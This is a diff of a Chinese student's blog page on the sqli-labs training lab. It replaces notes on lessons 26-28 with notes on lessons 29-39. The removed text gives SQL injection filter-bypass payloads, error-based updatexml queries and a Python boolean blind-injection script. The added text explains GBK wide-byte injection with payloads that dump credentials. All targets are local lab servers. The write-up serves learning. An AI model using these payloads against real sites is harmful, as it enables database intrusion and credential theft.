@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="lesson26-28, 黛色若梦">
+    <meta name="keywords" content="lesson29-39, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>lesson26-28 | 黛色若梦</title>
+    <title>lesson29-39 | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">lesson26-28</h1>
+                    <h1 class="description center-align post-title">lesson29-39</h1>
                 </div>
             </div>
         </div>
@@ -430,9 +430,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sqli%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">sqli靶场</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -444,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-12-03
+                    2021-12-10
                 </div>
                 
 
@@ -465,132 +469,71 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="lesson-26-28"><a href="#lesson-26-28" class="headerlink" title="lesson 26-28"></a>lesson 26-28</h1><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="(1)前言"></a>(1)前言</h3><p>记得我已经把admin的密码换成1234了！！！</p>
-<p>昨晚赶作业做到好晚没做sql，程序的题目也是不熟练，接下来是考试月了，的确要好好复习，好好备考。然后认认真真得去写博客，格式化坚持更新吧。</p>
-<h3 id="（2）练习"><a href="#（2）练习" class="headerlink" title="（2）练习"></a>（2）练习</h3><hr>
-<p>第二十六关</p>
-<p>1.判断注入方式：是单引闭合。</p>
-<p>2.学习源码：</p>
-<p><img src="/images/26.png" alt="26"></p>
-<p><img src="/images/26%EF%BC%882%EF%BC%89.png" alt="26（2）"></p>
-<p>还是我们的老朋友preg_replace，这次他把好多辅助功能的字符都转义过滤了，过滤了上一关的<code>or</code>与<code>and</code>，还过滤了单行注释<code>--</code>与<code>#(含URL编码)</code>以及多行注释<code>/**/</code>（被解释为空格，常用于过滤空格时），还过滤了<code>(空格)</code>，以及正反斜杠<code>/</code>与<code>\</code>。再来找找新方法吧。</p>
-<p>绕过思路：</p>
-<h4 id="对于空格绕过"><a href="#对于空格绕过" class="headerlink" title="对于空格绕过"></a>对于空格绕过</h4><p>a.<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_urlencode.asp">URL 编码替代方法</a></p>
+                <h1 id="lesson29-39"><a href="#lesson29-39" class="headerlink" title="lesson29-39"></a>lesson29-39</h1><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>作者是个菜鸡，有不对的地方望请各路大佬见谅和指出。</p>
+<p>立个flag，这个月要把sqli靶场搞完，其实理应在十一月就搞完了。</p>
+<hr>
+<p>第二十九关–第三十一关</p>
+<p>注入点判断</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.127.1/sqli-labs-master/Less-29/?id=1&#39;">http://192.168.127.1/sqli-labs-master/Less-29/?id=1&#39;</a> and ‘1’=’1</p>
+<p>这题说是有waf,但是在尝试的时候并未显现任何过滤的内容，所以应该是有某些尝试错误的。</p>
+<p>查看源码，果然发现存在一个login.php文件，这个页面是有被waf的。然后这提示用到双重服务器，注意这里的第一层即我们之前搭建的是Apache的服务器，仅仅这样不然就与第一关没有区别了。所以找到本地文件中的PHP文件，发现存在login.jps文件，安装tomcat服务器，配置环境。</p>
+<p>再跳转到login.jps的页面进行sql注入。</p>
+<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
+<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
+<p>环境没搞出来，明天再搞，先做其他的。</p>
+<p>33关–37关</p>
+<h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>第32关</p>
+<p>我们看到这个转义的16进制是5c，如果能够吞掉这个5c，就能够解决这个转义问题</p>
 <ul>
-<li><p><code>%09</code> TAB 键（水平）</p>
-</li>
-<li><p><code>%0a</code> 新建一行</p>
-</li>
-<li><p><code>%0b</code> TAB 键（垂直）</p>
-</li>
-<li><p><code>%0c</code> 新的一页</p>
-</li>
-<li><p><code>%0d</code> return 功能</p>
-</li>
-<li><h5 id="a0-空格"><a href="#a0-空格" class="headerlink" title="%a0 空格"></a><code>%a0</code> 空格</h5><p>这里有一个别人写的脚本判断哪些 URL 编码能够代替空格，因 Windows 原因没有测试：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;http://localhost/sqli-labs/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br></pre></td></tr></table></figure>
-
-<p>现在还看不太懂，但是没关系之后再来看看。</p>
-</li>
+<li>如何吞掉</li>
+<li>比如一个汉字：運，他的16进制编码就是df5c，正好有个5c。当然汉字 猏，aa5c也可以。</li>
+<li>输入：<code>http://127.0.0.1/sqli/Less-32/?id=1%df&#39;</code>报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘<code>&#39;1�\\&#39;&#39; LIMIT 0,1</code>’ at line 1，说明这个是用单引号括起来的字符型漏洞。然后我们就可以利用这个漏洞进行操作了</li>
+<li><code>http://127.0.0.1/sqli/Less-32/?id=1%df&#39; and 1=2 union select 1,2,3 --+</code> 判断回显点</li>
 </ul>
-<p>啊哈运行后好像是这样的：</p>
-<p><img src="/images/26%EF%BC%883%EF%BC%89.png" alt="26（3）"></p>
-<p>b.注释：/**/ 这里不能用</p>
-<p>c.使用括号，这个在之前的sqli题目中有做到哦。</p>
-<h4 id="or-and绕过"><a href="#or-and绕过" class="headerlink" title="or,and绕过"></a>or,and绕过</h4><p>题目还将<code>and、or</code>等下列这些字符不区分大小写且用空格代替，于是想到利用双写绕过<code>oorr</code>,<code>and</code>也可以用&amp;&amp;(<code>%26%26</code>)来绕过，<code>or</code>可以用<code>||</code>来绕过。</p>
-<p>3.注入方法:</p>
-<p>（1）一个思路是用代替字符然后用联合的注入语句。</p>
-<p>但是这种方法用的时候出现了一点问题。网上的解释是这样的：<strong>在 windows 下无法使用一些特殊的字符代替空格，此处是因为 apache 的解析的问题，这里请更换到 linux 平台下</strong></p>
-<p><img src="/images/26%EF%BC%884%EF%BC%89.png" alt="26（4）"></p>
-<p>padload</p>
-<p>1.<a target="_blank" rel="noopener" href="http://localhost:8088/sqlilabs/Less-26/?id=0&#39;%a0union%a0select%a02,database(),4%a0||%a0&#39;1&#39;=&#39;1">http://localhost:8088/sqlilabs/Less-26/?id=0&#39;%a0union%a0select%a02,database(),4%a0||%a0&#39;1&#39;=&#39;1</a></p>
-<p>2.?id=0’%a0union%a0select%a02,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=’security’),4%a0||%a0’1’=’1</p>
-<p>3.?id=0’%a0union%a0select%a02,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=’security’%a0&amp;&amp;%a0table_name=’users’),4%a0||%a0’1’=’1</p>
-<p>4.<a target="_blank" rel="noopener" href="http://localhost:8088/sqlilabs/Less-23/?id=0&#39;%a0union%a0select%a02,(select%a0group_concat(concat_ws(&#39;-&#39;,id,username,passwoorrd))%a0from%a0users),4%a0||%a0&#39;1&#39;=&#39;1">http://localhost:8088/sqlilabs/Less-23/?id=0&#39;%a0union%a0select%a02,(select%a0group_concat(concat_ws(&#39;-&#39;,id,username,passwoorrd))%a0from%a0users),4%a0||%a0&#39;1&#39;=&#39;1</a></p>
-<p>（2）另一个是用报错的updatexml/extractvalue,用括号来括起来就行。</p>
-<p>而在这关严格的过滤条件下，不能使用<code>limit</code>，需要改变形式。没有空格不能使用<code>limit 0,1</code>，而报错有字符限制也不能使用<code>group_concat()</code>，所以只能使用<code>where</code>条件来控制偏移量。</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.127.1/sqli-labs-master/Less-26/?id=0&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;=&#39;1">http://192.168.127.1/sqli-labs-master/Less-26/?id=0&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;=&#39;1</a></p>
-<p>?id=0’||updatexml(1,concat(‘$’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),0)||’1’=’1</p>
-<p>?id=0’||updatexml(1,concat(‘$’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=’security’)%26%26(table_name=’users’))),0)||’1’=’1</p>
-<p><a target="_blank" rel="noopener" href="http://localhost:8088/sqlilabs/Less-26/?id=0&#39;||updatexml(1,concat(&#39;$&#39;,(select(concat(&#39;$&#39;,id,&#39;$&#39;,username,&#39;$&#39;,passwoorrd))from(users)where(username)=&#39;admin&#39;)),0)||&#39;1&#39;=&#39;1">http://localhost:8088/sqlilabs/Less-26/?id=0&#39;||updatexml(1,concat(&#39;$&#39;,(select(concat(&#39;$&#39;,id,&#39;$&#39;,username,&#39;$&#39;,passwoorrd))from(users)where(username)=&#39;admin&#39;)),0)||&#39;1&#39;=&#39;1</a></p>
-<p>(3)布尔盲注</p>
-<p>考虑将某个字段的所有字段全部连接成一个字符串依次得到字符，即使用<code>group_concat()</code>。<br> 因后台过滤<code>or</code>和<code>and</code>，且浏览器过滤<code>&amp;</code>，需使用<code>%26</code>，下面是三个 payload 模板：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))&gt;65)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)where(table_schema=&#x27;database_name&#x27;%26%26table_name=&#x27;table_name&#x27;)),1,1))&gt;65)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;%26%26(ascii(mid((select(group_concat(concat_ws(&#x27;$&#x27;,id,username,passwoorrd)))from(users)),1,1))&gt;65)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>若还过滤了<code>,</code>，便可使用：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(string,start,length)` = `mid(string from start for length)</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>贴一个脚本好好理解：二分法又来了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span>(<span class="params">char_index, <span class="built_in">ascii</span></span>):</span></span><br><span class="line">    <span class="comment"># 系统表中数据</span></span><br><span class="line">    info_database_name = <span class="string">&quot;infoorrmation_schema&quot;</span></span><br><span class="line">    info_table_name = <span class="string">&quot;schemata&quot;</span> <span class="comment"># schemata / tables / columns</span></span><br><span class="line">    info_column_name = <span class="string">&quot;schema_name&quot;</span> <span class="comment"># schema_name / table_name / column_name</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 注入表中数据</span></span><br><span class="line">    database_name = <span class="string">&quot;security&quot;</span></span><br><span class="line">    table_name = <span class="string">&quot;users&quot;</span></span><br><span class="line">    column_name = [<span class="string">&quot;id&quot;</span>,<span class="string">&quot;username&quot;</span>,<span class="string">&quot;passwoorrd&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 附加url</span></span><br><span class="line">    start_str = <span class="string">&quot;1&#x27;%26%26&quot;</span></span><br><span class="line">    end_str = <span class="string">&quot;||&#x27;1&#x27;=&#x27;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 连接select</span></span><br><span class="line">    where_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#where_str = &quot;where(table_schema=&#x27;&quot;+database_name+&quot;&#x27;%26%26table_name=&#x27;&quot;+table_name+&quot;&#x27;)&quot;</span></span><br><span class="line">    select_str = <span class="string">&quot;select(group_concat(&quot;</span>+info_column_name+<span class="string">&quot;))from(&quot;</span>+info_database_name+<span class="string">&quot;.&quot;</span>+info_table_name+<span class="string">&quot;)&quot;</span>+where_str</span><br><span class="line">    <span class="comment">#select_str = &quot;select(group_concat(concat_ws(&#x27;$&#x27;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;)))from(&quot;+table_name+&quot;)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 连接payload</span></span><br><span class="line">    sqli_str = <span class="string">&quot;(ascii(mid((&quot;</span>+select_str+<span class="string">&quot;),&quot;</span>+<span class="built_in">str</span>(char_index)+<span class="string">&quot;,1))&gt;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ascii</span>)+<span class="string">&quot;)&quot;</span></span><br><span class="line">    payload = start_str + sqli_str + end_str</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span>(<span class="params">char_index, <span class="built_in">ascii</span></span>):</span></span><br><span class="line">    <span class="comment"># 连接url</span></span><br><span class="line">    url = <span class="string">&quot;http://localhost:8088/sqlilabs/Less-26/?id=&quot;</span></span><br><span class="line">    exec_url = url + getPayload(char_index, <span class="built_in">ascii</span>)</span><br><span class="line">    <span class="comment">#print(exec_url)</span></span><br><span class="line">    <span class="comment"># 检查回显</span></span><br><span class="line">    echo = <span class="string">&quot;Your Login name&quot;</span></span><br><span class="line">    content = requests.get(exec_url).text</span><br><span class="line">    <span class="keyword">if</span> echo <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dichotomy</span>(<span class="params">char_index, left, right</span>):</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment"># 二分法</span></span><br><span class="line">        <span class="built_in">ascii</span> = <span class="built_in">int</span>((left+right)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> execute(<span class="built_in">str</span>(char_index+<span class="number">1</span>), <span class="built_in">str</span>(<span class="built_in">ascii</span>)):</span><br><span class="line">            left = <span class="built_in">ascii</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = <span class="built_in">ascii</span></span><br><span class="line">        <span class="comment"># 结束二分</span></span><br><span class="line">        <span class="keyword">if</span> left == right-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> execute(<span class="built_in">str</span>(char_index+<span class="number">1</span>), <span class="built_in">str</span>(<span class="built_in">ascii</span>)):</span><br><span class="line">                <span class="built_in">ascii</span> += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">ascii</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>): <span class="comment"># 查询结果的长度</span></span><br><span class="line">        char = dichotomy(<span class="built_in">len</span>, <span class="number">30</span>, <span class="number">126</span>) </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(char) == <span class="number">31</span>: <span class="comment"># 单条查询结果已被遍历</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(char)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    sys.stdout.write(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>26a</p>
-<p>在没有过滤时，第一件事是判断注入类型，是字符型还是数字型。<br>而有过滤时，判断注入类型后最重要的就是判断过滤条件。</p>
-<p>注入类型：</p>
-<p>字符型确定了，但是是不是有括号呢——</p>
-<p>判断小括号有几种方法：</p>
-<ol>
-<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
-</ol>
-<ul>
-<li><p>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</p>
-</li>
-<li><p>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。#恍然大悟！</p>
-<p>2.<code>1&#39;)||&#39;1&#39;=(&#39;1</code><br> 若查询语句有小括号正确回显，若无小括号错误回显（无回显）</p>
-</li>
-</ul>
-<p>然后就可以继续开始判断过滤了，向上面26关一样。</p>
-<p>作者：Hyafinthus<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ff72f2c6d99c">https://www.jianshu.com/p/ff72f2c6d99c</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-<hr>
-<p>第二十七关&amp;a</p>
-<p>1.注入点：是单引号闭合。</p>
-<p>2.源码学习：</p>
-<p>没有过滤<code>or</code>与<code>and</code>，过滤了几个大小写的<code>union</code>和<code>select</code>但是可以用随机大小写绕过，过滤了<code>--</code>、<code>#</code>以及<code>/**/</code>，过滤了两次<code>空格</code>，过滤了<code>/</code>但没过滤<code>\</code>。<br> 所以实际上只过滤了<code>注释</code>与<code>空格</code>，与 Less 26 相似。</p>
-<p><img src="../images/27.png" alt="27"></p>
-<p>这里后面多了一些正则表达式。模式修饰符<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers"> ¶</a></p>
-<p>下面列出了当前可用的 PCRE 修饰符。括号中提到的名字是 PCRE 内部这些修饰符的名称。 模式修饰符中的空格，换行符会被忽略，其他字符会导致错误。</p>
-<p>i<br>如果设定此修正符，模式中的字符将同时匹配大小写字母。</p>
-<p>m<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</p>
-<p>s<br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</p>
-<p>x<br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。</p>
-<p>e<br>如果设定了此修正符，preg_replace() 在替换字符串中对逆向引用作正常的替换，</p>
-<p>?在 . + 和 * 之后 表示非贪婪匹配: *、+和?限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个?就可以实现非贪婪或最小匹配。</p>
-<p><a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-intro.html">正则表达式</a></p>
-<p>3.注入：了解了以后可以试着解题。我们发现这里的union select不能用编码（源码中的正则表达式意味着只要含有就会被过滤），可以使用混合大小写来绕过，负号被过滤，则说明用任何一个id不存在的值且为正数即可。</p>
-<p>数据库名</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://192.168.127.1/sqli-labs-master/Less-27/?id=0&#39;%0aUnIoN%0aSeLeCt%0a2,database(),4%0a||%0a&#39;1&#39;=&#39;1">http://192.168.127.1/sqli-labs-master/Less-27/?id=0&#39;%0aUnIoN%0aSeLeCt%0a2,database(),4%0a||%0a&#39;1&#39;=&#39;1</a></p>
-</blockquote>
-<p>其他padload类似构造即可。</p>
-<p>27a</p>
-<p>注入类型为双引号注入<img src="../images/27a.png" alt="27a"></p>
-<p>其他就和27一样的。</p>
-<hr>
-<p>第二十八关</p>
-<p>注入类型：单引号 有错误但没有报错    <strong>首先排除报错注入</strong>  ，判断后是‘）</p>
-<p>源码：<img src="../images/28.png" alt="28"></p>
-<p>不同环境下过滤情况不一样，在 windows 下无法使用一些特殊的字符代替空格，此处是因为 apache 的解析的问题，这里请更换到 linux 平台下（下次有空搭一个ubuntu_LAMP的环境）</p>
-<p>\s+说明所有的空格、空白符以及换行符被过滤掉了。而且匹配很多次。</p>
-<p>/i说明大小写的方法失效了，但是还是可以用双写绕过。uniunionon</p>
-<p>和selecselectt即可。</p>
-<p>补充一种理解：尝试使用<strong>联合查询注入</strong>，构造语句<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-28/?id=1%27);union%20select%00,%E7%9C%8B%E5%9B%9E%E6%98%BE">http://127.0.0.1/sqli-labs/Less-28/?id=1%27);union%20select%00,看回显</a><br>空格没有了，说明空格被过滤了，尝试使用特殊字符绕过过滤，经测试如下特殊字符可以替换空格%0a,%0d,%20,%0b,/%0a/，再来构造<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-28/?id=1%27);union%0Dselect%0D1,2,3;%00%EF%BC%8C%E7%9C%8B%E5%9B%9E%E6%98%BE">http://127.0.0.1/sqli-labs/Less-28/?id=1%27);union%0dselect%0d1,2,3;%00，看回显</a><br>，由前后两次构造的语句和回显提示，说明过滤了union+空格（包括可替代空格的特殊字符）+select，<strong>但是又没过滤单独存在的union,select</strong>,尝试构造<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-28/?id=0&#39;)union%0dunion%0dselectselect%0d1,2,3%E7%9C%8B%E6%98%AF%E5%90%A6%E8%83%BD%E5%9B%9E%E6%98%BE%E6%AD%A3%E5%B8%B8%EF%BC%8C%E6%B5%8B%E8%AF%95%E5%90%8E%EF%BC%8C%E7%BB%93%E6%9E%9C,%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E5%AD%98%E5%9C%A8%EF%BC%8C%E6%9F%A5%E8%AF%A2%E6%96%B9%E6%B3%95%E5%89%8D%E9%9D%A2%E5%B7%B2%E6%9C%89%EF%BC%8C%E6%90%9E%E5%AE%9A%E3%80%82%E5%90%8E%E9%9D%A2%E7%9A%84padload%E5%B0%B1%E6%98%AF%E5%B8%B8%E8%A7%84%E7%9A%84%E6%9E%84%E9%80%A0%E4%BA%86%E3%80%82">http://127.0.0.1/sqli-labs/Less-28/?id=0&#39;)union%0dunion%0dselectselect%0d1,2,3看是否能回显正常，测试后，结果,联合查询注入存在，查询方法前面已有，搞定。后面的padload就是常规的构造了。</a></p>
-<p>————————————————<br>版权声明：本文为CSDN博主「··KElis」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43579362/article/details/104324346">https://blog.csdn.net/qq_43579362/article/details/104324346</a></p>
-<p>同时可用布尔注入</p>
-<p>28a</p>
-<p>注入方式：’）</p>
-<p>只过滤了union和select</p>
-<p><img src="../images/28a.png" alt="28a"></p>
-<p>还是双写绕过，空格没过滤，</p>
-<p>padload:</p>
-<p>/?id=-1’) uniounion selectn select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),3%23</p>
+<p>参考资料：GBK的内容：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php</a></p>
+<p>mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ‘ 的时候，往往利用的思路是将 ‘ 转换为 &#39; （转换的函数可以自定义，也可以用PHP自带函数）。<br>因此我们在此想办法将 ‘ 前面添加的\除掉，一般有两种思路：<br>1.%df吃掉\具体的原因是urlencode(‘) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此时%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2.将&#39;中的\过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</p>
+<p>感觉题目在提示我们用16进制编码形式。</p>
+<p><img src="/images/%E7%94%A8gbk%E7%BC%96%E7%A0%81.png" alt="用gbk编码"></p>
+<p><img src="/images/image-20211211003157297.png" alt="image-20211211003157297"></p>
+<p>users的十六进制编码:0x7573657273</p>
+<p>宽字节注入</p>
+<p>?id=-1%df’ UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users–+</p>
+<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+</code></p>
+<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+ </code></p>
+<p> <code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 oder by 3--+ </code></p>
+<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=0%df%5c%27 union select 1,2,3--+ </code></p>
